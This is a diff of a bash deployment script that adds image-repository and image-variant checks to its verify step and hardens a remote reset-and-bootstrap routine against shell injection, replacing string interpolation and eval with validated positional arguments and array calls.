+  expected_ref="${expected_repo}:${env_tag}"
+  running_image="$(read_running_api_image "$env")"
+  if [[ -z "${running_image}" ]]; then
+    warn "IMAGE VERIFY: could not read running api Config.Image on ${env} (container missing?)"
+    return 1
+  fi
+  # Accept tag form (repo:tag) or digest form (repo@sha256:...) under expected_repo.
+  case "${running_image}" in
+    "${expected_repo}:"*|"${expected_repo}"@*)
+      log "Image verified: ${env} running ${running_image} (repo matches ${expected_repo} via ${source_note}; expected tag ref ${expected_ref})"
+      return 0
+      ;;
+  esac
+  # Loud mismatch — silent success with the wrong repo was the VLM deploy bug.
+  # return (not fail/exit) so callers can honor ACX_VERIFY_OPTIONAL.
+  warn "IMAGE MISMATCH: ${env} running container image is '${running_image}', expected repository '${expected_repo}' via ${source_note} (deployed as ${expected_ref}). Variant deploys must not silently run a different repo."
+  return 1
+}
+
 do_verify() {
   local env="$1"
   local url expected_sha actual_sha body attempt max_attempts sleep_s
+  local actual_variant expected_variant remote_for_variant
   url="$(env_to_health_url "$env")"
   # Use GIT_REF (defaults to HEAD) so verify after `GIT_REF=v0.4.1 deploy ...`
   # checks against the same ref the build/push paths used.
@@ -934,6 +1598,12 @@ do_verify() {
   # verification, while a genuinely missing/skewed SHA still fails closed.
   max_attempts="${ACX_VERIFY_ATTEMPTS:-5}"
   sleep_s="${ACX_VERIFY_SLEEP:-5}"
+  if ! [[ "${max_attempts}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_VERIFY_ATTEMPTS must be a positive integer (got: ${max_attempts})"
+  fi
+  if ! [[ "${sleep_s}" =~ ^[0-9]+$ ]]; then
+    fail "ACX_VERIFY_SLEEP must be a non-negative integer (got: ${sleep_s})"
+  fi
 
   for attempt in $(seq 1 "$max_attempts"); do
     log "GET ${url} (attempt ${attempt}/${max_attempts})"
@@ -954,7 +1624,49 @@ do_verify() {
     fi
 
     if [[ "${actual_sha:0:8}" == "${expected_sha:0:8}" ]]; then
-      log "Verified: ${env} runs ${actual_sha:0:8} (matches GIT_REF=${GIT_REF})"
+      # HARM-A-04: commit_sha alone cannot distinguish recognition vs VLM images
+      # that share a GIT_REF. Parse image_variant from /health (build-immutable
+      # signal) and compare to expected (local resolve, or remote repo name for
+      # bare standalone verify).
+      actual_variant="$(printf '%s' "$body" | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("image_variant") or "")' 2>/dev/null || true)"
+      if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" \
+         || -n "${ACX_BUILD_TARGET:-}" \
+         || -n "${ACX_IMAGE_VARIANT:-}" ]]; then
+        expected_variant="$(expected_image_variant)"
+      else
+        # Bare verify: derive expectation from sticky remote repo when present.
+        remote_for_variant="$(read_remote_image_repo "$env" || true)"
+        if [[ "${remote_for_variant}" == "__INVALID_REPO__" ]]; then
+          warn "VARIANT VERIFY: remote ACX_IMAGE_REPO failed charset validation"
+          return 1
+        fi
+        if [[ -n "${remote_for_variant}" ]]; then
+          expected_variant="$(variant_from_image_repo "${remote_for_variant}")"
+        else
+          expected_variant="$(expected_image_variant)"
+        fi
+      fi
+      if [[ -n "${actual_variant}" && "${actual_variant}" != "${expected_variant}" ]]; then
+        warn "VARIANT MISMATCH: ${env} /health image_variant='${actual_variant}', expected '${expected_variant}' (recognition vs VLM share commit_sha — this is the build-immutable signal)"
+        if (( attempt < max_attempts )); then
+          sleep "$sleep_s"
+          continue
+        fi
+        return 1
+      fi
+      # Also compare the running container image (read from runtime — rg-015)
+      # against expected repo. Must return (not fail/exit) so ACX_VERIFY_OPTIONAL works.
+      if ! verify_running_image_matches_deployed "$env"; then
+        # Image mismatch is not a warm-up flake — still retry once more in case
+        # compose is mid-pull, but do not call fail() here.
+        if (( attempt < max_attempts )); then
+          warn "Image mismatch on attempt ${attempt}/${max_attempts}; retrying after ${sleep_s}s"
+          sleep "$sleep_s"
+          continue
+        fi
+        return 1
+      fi
+      log "Verified: ${env} runs ${actual_sha:0:8} (matches GIT_REF=${GIT_REF}${actual_variant:+, image_variant=${actual_variant}})"
       return 0
     else
       warn "SKEW: ${env} runs ${actual_sha:0:8}, expected ${expected_sha:0:8} (attempt ${attempt}/${max_attempts}; warm-up retry)"
@@ -1066,38 +1778,42 @@ do_reset() {
     fail "ACX_RESET_SITE_URL must be set to the WordPress site URL the plugin will hit (e.g. http://localhost:10010 for LocalWP, or https://staging.altcontext.com). The bootstrap derives the per-site tenant UUID from this value to match the plugin's TenantIdentity::derive_from_site_url() (E15-12-BR-06). Set ACX_RESET_TENANT_ID as well only if you need to override derivation for a custom tenant."
   fi
   local site_url="${ACX_RESET_SITE_URL}"
+  # D1/S2-A-02: validate BEFORE any ssh/bootstrap interpolation — these reach remote root via sudo.
+  assert_safe_reset_site_url "${site_url}"
   local tenant_id
   if [[ -n "${ACX_RESET_TENANT_ID:-}" ]]; then
     tenant_id="${ACX_RESET_TENANT_ID}"
   else
     tenant_id="$(python3 "${SCRIPT_DIR}/_derive_tenant_id.py" "${site_url}")"
   fi
-  # E15-12-BR-05: each `docker compose exec -T` reads from this script's
-  # stdin (the `bash -s <<<"${bootstrap_cmd}"` heredoc on line 509). Without
-  # `< /dev/null` on each exec, the first call swallows the remaining lines
-  # of bootstrap_cmd and the second call silently never runs — the operator
-  # sees the tenant create succeed but no `api_key=` line is printed and the
-  # plugin has nothing to authenticate with.
-  local bootstrap_cmd
-  printf -v bootstrap_cmd '%s\n' \
-    "cd ${remote_dir}" \
-    "echo '==> Ensuring tenant row exists for service-mode key bootstrap'" \
-    "sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant ${tenant_id} --site-url ${site_url} < /dev/null" \
-    "echo '==> Creating post-reset service-mode API key (operator: copy api_key= line into the plugin)'" \
-    "sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant ${tenant_id} < /dev/null"
+  assert_safe_shell_token "ACX_RESET_TENANT_ID" "${tenant_id}"
+
+  # E15-12-BR-05: each `docker compose exec -T` reads from the remote script's stdin.
+  # Without `< /dev/null` on each exec, the first call swallows remaining lines and the
+  # second call never runs. Tenant/site values are positional args to `bash -s` (quoted
+  # heredoc) — never interpolated into the remote command string (S2-A-02).
+  # Audit text for dry-run / operator review. The LIVE path never interpolates these into a
+  # remote shell string — it passes them as bash -s positional args (see ssh below).
+  local bootstrap_summary
+  printf -v bootstrap_summary '%s\n' \
+    "bash -s -- ${remote_dir} ${tenant_id} ${site_url}" \
+    "  # remote body (quoted heredoc): \$1=remote_dir \$2=tenant_id \$3=site_url" \
+    "  cd \"\$1\"" \
+    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant ${tenant_id} --site-url ${site_url} < /dev/null" \
+    "  sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant ${tenant_id} < /dev/null"
 
   # /ready verification: distinct from /health because reset specifically needs
   # dependency readiness (postgres up, schema migrated, models loaded) before
-  # we declare the env operable.
-  local verify_cmd="curl -fsS --max-time 30 ${ready_url}"
+  # we declare the env operable. Array form — no shell-eval of the verify command (S2-A-02).
+  local -a verify_cmd=(curl -fsS --max-time 30 "${ready_url}")
 
   if [[ "${ACX_RESET_DRY_RUN:-0}" == "1" ]]; then
     log "DRY-RUN: would invoke ssh ${SSH_TARGET} with the following remote command:"
     printf '%s\n' "${remote_cmd}"
     log "DRY-RUN: would then verify readiness:"
-    printf '%s\n' "${verify_cmd}"
+    printf '%s\n' "${verify_cmd[*]}"
     log "DRY-RUN: would then run post-reset bootstrap on ${SSH_TARGET}:"
-    printf '%s\n' "${bootstrap_cmd}"
+    printf '%s\n' "${bootstrap_summary}"
     log "DRY-RUN: no SSH session opened; no remote state mutated"
     return 0
   fi
@@ -1106,14 +1822,14 @@ do_reset() {
   # Face-pipeline weights must exist before reset restarts the runtime (C-02).
   preflight_remote_face_pipeline_models "$env"
   log "Executing reset on ${SSH_TARGET}"
-  ssh "${SSH_TARGET}" "bash -s" <<<"${remote_cmd}"
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "bash -s" <<<"${remote_cmd}"
 
   log "Verifying readiness at ${ready_url}"
   # Brief settle window: systemd start is async; the unit may need a few seconds
   # before postgres + the API report ready. The bootstrap must wait for /ready
   # because `docker compose exec api` requires the api container to be up.
   local attempts=0
-  until eval "${verify_cmd}"; do
+  until "${verify_cmd[@]}"; do
     attempts=$((attempts + 1))
     if (( attempts >= 6 )); then
       fail "Readiness check failed after ${attempts} attempts at ${ready_url}"
@@ -1123,7 +1839,21 @@ do_reset() {
   done
 
   log "Running post-reset bootstrap on ${SSH_TARGET} (tenant create + key create)"
-  ssh "${SSH_TARGET}" "bash -s" <<<"${bootstrap_cmd}"
+  # Positional args — quoted heredoc body never expands local shell values into the
+  # remote command string. tenant_id / site_url reach remote only as argv after --.
+  # Unquoted multi-word form: OpenSSH joins destination args into the remote command, so
+  # remote argv is: bash -s -- <remote_dir> <tenant_id> <site_url> (charset-validated above).
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" bash -s -- "${remote_dir}" "${tenant_id}" "${site_url}" <<'BOOTSTRAP'
+set -euo pipefail
+remote_dir="$1"
+tenant_id="$2"
+site_url="$3"
+cd "${remote_dir}"
+echo "==> Ensuring tenant row exists for service-mode key bootstrap"
+sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod tenant create --tenant "${tenant_id}" --site-url "${site_url}" < /dev/null
+echo "==> Creating post-reset service-mode API key (operator: copy api_key= line into the plugin)"
+sudo docker compose -f docker-compose.env.yml exec -T api python -m scripts.manage_api_keys --env prod create --tenant "${tenant_id}" < /dev/null
+BOOTSTRAP
 
   log "Reset complete. ${ready_url} returned ready and a fresh service-mode API key was printed above."
 }
@@ -1139,6 +1869,7 @@ if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
     deploy)       [[ -n "${1:-}" ]] || fail "deploy requires <env>"; do_deploy "$@" ;;
     promote)      [[ -n "${1:-}" && -n "${2:-}" ]] || fail "promote requires <from-env> <to-env>"; do_promote "$1" "$2" ;;
     reset)        [[ -n "${1:-}" ]] || fail "reset requires <env> (dev|dev-fir|staging|prod)"; do_reset "$1" ;;
+    clear-image-repo) [[ -n "${1:-}" ]] || fail "clear-image-repo requires <env> (dev|dev-fir|staging|prod)"; clear_remote_image_repo_env "$1" ;;
     verify)       do_verify "${1:-dev}" ;;
     status)       do_status ;;
     ""|-h|--help|help)
